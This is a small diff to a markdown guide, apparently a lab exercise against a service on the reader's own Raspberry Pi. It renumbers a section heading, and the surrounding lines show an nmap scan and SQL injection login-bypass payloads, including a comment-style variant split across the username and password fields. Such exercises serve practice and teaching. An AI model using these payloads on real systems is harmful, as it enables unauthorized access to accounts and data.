@@ -66,7 +66,7 @@ nmap -p 5000 [YOUR-PI-IP]
 Username: `admin' OR '1'='1' --`
 Password: `anything`
 
-**Option 3 (Comment style):**
+**Option 2 (Comment style):**
 Username: `admin' /*`
 Password: `*/ OR '1'='1`
 
